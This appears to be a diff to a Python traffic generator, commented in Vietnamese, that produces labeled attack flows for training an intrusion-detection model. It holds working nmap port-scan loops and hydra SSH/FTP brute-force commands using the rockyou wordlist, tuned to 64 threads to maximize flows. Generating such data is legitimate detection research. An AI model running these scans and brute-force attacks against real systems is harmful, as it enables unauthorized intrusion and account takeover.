@@ -109,87 +109,70 @@ def idle(min_s, max_s, reason=""):
 
 
 # ============================================================================
-# PHASE 1: PORT SCAN (~17,500 flows, ~5 phút)
-# Mỗi port probe = 1 flow. Scan 18,000 ports = ~18,000 flows
+# PHASE 1: PORT SCAN (HIGH FLOW: ~15,000-25,000 flows, ~25-30 phút)
+# Nhiều cổng bị firewall DROP → flow 1 gói hay bị CICFlowMeter loại → ít flow.
+# Cách chắc ăn: LẶP NHIỀU VÒNG (như run11_portscan_boost) + mở rộng dải cổng.
+# Giữ -sT + --max-retries 0 cho khớp dữ liệu train (run10/run11).
 # ============================================================================
 def phase_portscan(target, writer):
+    ROUNDS = 12                 # số vòng quét lặp lại để tích lũy nhiều flow
+    scan_ranges = ["1-5000", "5001-10000", "10001-16000", "16001-20000"]
+
     print(f"\n{'='*60}")
-    print(f"  ██ PHASE 1: PORT SCAN")
-    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~5 phút")
+    print(f"  ██ PHASE 1: PORT SCAN — HIGH FLOW")
+    print(f"  ██ Mục tiêu: ~15,000-25,000 flows | {ROUNDS} vòng | ~25-30 phút")
     print(f"{'='*60}")
 
-    scans = [
-        # (command, description, estimated_flows)
-        # Chỉ dùng -sT (KHÔNG -sV) + --max-retries 0 để mỗi port = đúng 1 probe
-        # → unique dst_port count cao, discriminative với Benign
-        (f"sudo nmap -sT -T5 -p 1-5000 --max-retries 0 {target}",
-         "TCP Connect scan ports 1-5000", 5000),
+    total = ROUNDS * len(scan_ranges)
+    n = 0
+    for r in range(1, ROUNDS + 1):
+        for rng in scan_ranges:
+            n += 1
+            cmd = f"sudo nmap -sT -T5 -p {rng} --max-retries 0 {target}"
+            desc = f"TCP Connect scan ports {rng} (vòng {r}/{ROUNDS})"
+            if not run_attack(cmd, "PortScan", target, "Multiple", desc, writer, n, total):
+                return
+            if n < total:
+                idle(2, 4, "giữa các scan")
 
-        (f"sudo nmap -sT -T5 -p 5001-10000 --max-retries 0 {target}",
-         "TCP Connect scan ports 5001-10000", 5000),
-
-        (f"sudo nmap -sT -T4 -p 10001-16000 --max-retries 0 {target}",
-         "TCP Connect scan ports 10001-16000", 6000),
-    ]
-
-    total = len(scans)
-    est_total = sum(s[2] for s in scans)
-
-    for i, (cmd, desc, est) in enumerate(scans, 1):
-        if not run_attack(cmd, "PortScan", target, "Multiple", desc, writer, i, total):
-            return
-        if i < total:
-            idle(8, 12, "giữa các scan")
-
-    print(f"\n  ▸ Phase 1 hoàn tất. Ước tính: ~{est_total:,} flows")
+    print(f"\n  ▸ Phase 1 hoàn tất ({total} lượt quét). Ước tính: ~15,000-25,000 flows")
 
 
 # ============================================================================
-# PHASE 2: BRUTE FORCE — SSH + FTP (~17,500 flows, ~20 phút)
-# SSH: ~16 attempts/s với 16 threads → ~2,400 flows per 150s
-# FTP: ~20 attempts/s với 16 threads → ~2,400 flows per 120s
+# PHASE 2: BRUTE FORCE — SSH + FTP (HIGH FLOW: ~20,000-30,000 flows, ~35-40 phút)
+# Mỗi kết nối hydra (ephemeral src port mới) = 1 flow trong CICFlowMeter.
+# Tăng threads 16→64 + kéo dài thời gian → nhiều flow hơn hẳn run trước (2.7k).
+# Threads cao làm sshd vượt MaxStartups → sinh thêm nhiều flow SYN/RST ngắn.
 # ============================================================================
 def phase_bruteforce(target, writer):
+    THREADS = 64            # số kết nối song song (tăng từ 16) → nhiều flow
+    SSH_DUR = 300           # giây mỗi lệnh SSH (tăng từ 150)
+    FTP_DUR = 240           # giây mỗi lệnh FTP (tăng từ 120)
+    WL = "/usr/share/wordlists/rockyou.txt"
+
     print(f"\n{'='*60}")
-    print(f"  ██ PHASE 2: BRUTE FORCE (SSH + FTP)")
-    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~20 phút")
+    print(f"  ██ PHASE 2: BRUTE FORCE (SSH + FTP) — HIGH FLOW")
+    print(f"  ██ Mục tiêu: ~20,000-30,000 flows | {THREADS} threads | ~35-40 phút")
     print(f"{'='*60}")
 
-    attacks = [
-        # SSH Brute Force - nhiều username khác nhau
-        (f"timeout 150s hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
-         "SSH Brute root (150s, 16 threads)", "22"),
-
-        (f"timeout 120s hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
-         "FTP Brute admin (120s, 16 threads)", "21"),
-
-        (f"timeout 150s hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
-         "SSH Brute admin (150s, 16 threads)", "22"),
-
-        (f"timeout 120s hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
-         "FTP Brute root (120s, 16 threads)", "21"),
-
-        (f"timeout 150s hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
-         "SSH Brute user (150s, 16 threads)", "22"),
-
-        (f"timeout 120s hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
-         "FTP Brute user (120s, 16 threads)", "21"),
-
-        (f"timeout 150s hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
-         "SSH Brute ubuntu (150s, 16 threads)", "22"),
-
-        (f"timeout 120s hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
-         "FTP Brute ftp (120s, 16 threads)", "21"),
-    ]
+    attacks = []
+    # SSH Brute Force — nhiều username khác nhau (mỗi lệnh SSH_DUR giây)
+    for user in ["root", "admin", "user", "ubuntu", "test", "oracle"]:
+        attacks.append((f"timeout {SSH_DUR}s hydra -l {user} -P {WL} ssh://{target} -t {THREADS}",
+                        f"SSH Brute {user} ({SSH_DUR}s, {THREADS} threads)", "22"))
+    # FTP Brute Force (mỗi lệnh FTP_DUR giây)
+    for user in ["admin", "root", "user", "ftp", "anonymous"]:
+        attacks.append((f"timeout {FTP_DUR}s hydra -l {user} -P {WL} ftp://{target} -t {THREADS}",
+                        f"FTP Brute {user} ({FTP_DUR}s, {THREADS} threads)", "21"))
 
     total = len(attacks)
     for i, (cmd, desc, port) in enumerate(attacks, 1):
         if not run_attack(cmd, "Brute Force", target, port, desc, writer, i, total):
             return
         if i < total:
-            idle(8, 15, "giữa các brute force")
+            idle(3, 6, "giữa các brute force")
 
-    print(f"\n  ▸ Phase 2 hoàn tất. Ước tính: ~16,000-20,000 flows")
+    print(f"\n  ▸ Phase 2 hoàn tất. Ước tính: ~20,000-30,000 flows")
 
 
 # ============================================================================
